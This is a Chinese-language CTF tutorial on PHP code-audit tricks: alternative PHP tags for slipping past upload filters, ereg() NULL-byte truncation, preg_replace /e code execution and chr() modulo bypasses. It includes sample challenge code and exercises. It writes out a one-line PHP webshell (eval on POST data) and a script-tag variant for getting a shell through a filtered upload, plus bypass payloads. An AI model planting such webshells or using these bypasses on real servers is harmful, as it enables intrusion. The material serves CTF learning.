**0x00 另类的php标记**

1.<? ?>

短标签，short_open_tag 決定是否可使用短标记

2.<?=

等价于 <? echo，适用版本>PHP 5.4.0

3.<% %>

需要将asp_tags设成On，适用版本

4\. <script language="php">system(&ampquotid&ampquot); 等价于<?php
system("id");?>

标记问题存在于某些对文件内容检测的题目中，例如ichunqiu中发现的一道web题目。

![题目.webp.jpg](https://image.3001.net/images/20190827/1566872984_5d649598062bf.jpg!small)  

该题目允许上传任意文件，那么一般的思路就是直接上传个一句话木马来getshell，那按照正常流程走一遍，上传内容为：

<?php

eval($_POST['a']);

?>

上传后访问页面，得到以下内容：

eval($_POST['a']) ?>

过滤了<?php关键字，这里就可以用到上面所给的几种，考虑到环境的限制，采用最后一种标记。

  

eval($_POST[&#39;a&#39;])

 **0x01 常见的代码审计函数**

1.ereg()

在PHP7.0以下的版本，ereg函数都还能被使用，但是ereg函数本身存在着一个NULL绕过

以NCTF的题目为例子，题目源码如下：

> if (isset ($_GET['nctf'])) {
>
> if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
>
> echo '必须输入数字才行';
>
> else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)
>
> die('Flag: '.$flag);
>
> else
>
> echo '骚年，继续努力吧啊~';
>
> }

题目的正则中匹配的只有数字，但是只有数字过不了第二个strpos函数，那么利用ereg的%00截断，那么生成的payload为1%00%23biubiubiu，当然本题还有第二种做法，将nctf以数组的形式传入，ereg和strpos判断的结果都为NULL，都可以绕过判断。

2.preg_replace()

preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit
= -1[, int &$count]] ) : mixed

搜索subject中匹配pattern的部分，以replacement进行替换

特殊点：当第一个参数为/e修饰符的时候，replacement会被当做PHP代码执行，并且这有匹配成功才会执行。

<?php

$a='phpndsec';

preg_replace('/(.*)ndsec/e','print "test"',$a);

?>

运行结果如下，将replacement参数当做PHP代码执行，输出了test。

3.chr()

chr( int $ascii) : string

返回相对应于 ascii 所指定的单个字符。

大于256会mod 256

小于0会加上256的倍數，直到>0

在一些时候碰到

Example:

今年的ISCC中的一道例题。

> <?php
>
> error_reporting(0);
>
> require 'flag.php';
>
> $value = $_GET['value'];
>
> $password = $_GET['password'];
>
> $username = '';
>
> for ($i = 0; $i < count($value); ++$i) {
>
> if ($value[$i] > 32 && $value[$i] < 127) unset($value);
>
> else $username .= chr($value[$i]);
>
> if ($username == 'w3lc0me_To_ISCC2019' && intval($password) < 2333 &&
> intval($password + 1) > 2333) {
>
> echo 'Hello '.$username.'!', '  
> ', PHP_EOL;
>
> echo $flag, '
>
> * * *
>
> ';
>
> }
>
> }
>
> highlight_file( **FILE** );

首先限制了传入的数值，不允许传入在32到127之内的数值，那么利用chr特性，只需要传入所需字符串的ASCii+256，在进行chr()函数后就可以完成所需字符的传递，利用特性传递w3lc0me_To_ISCC2019，

绕过后面password即可得到flag。

  

 **0x02 思考**

1.思考这串代码在不实际运行的情况下判断出他的运行结果。

> <?php
>
> $a='phpndsec';
>
> preg_replace('/(.*)ndsec/e','\1info()',$a);
>
> ?>

2.思考能够获取到flag的payload。

> <?php
>
> error_reporting(0);
>
> require 'flag.php';
>
> $value = $_GET['value'];
>
> $password = $_GET['password'];
>
> $username = '';
>
> for ($i = 0; $i < count($value); ++$i) {
>
> if ($value[$i] > 32 && $value[$i] < 127) unset($value);
>
> else $username .= chr($value[$i]);
>
> if ($username == 'w3lc0me_Ndsec' ) {
>
> echo 'Hello '.$username.'!', '  
> ', PHP_EOL;
>
> echo $flag, '
>
> * * *
>
> ';
>
> }
>
> }

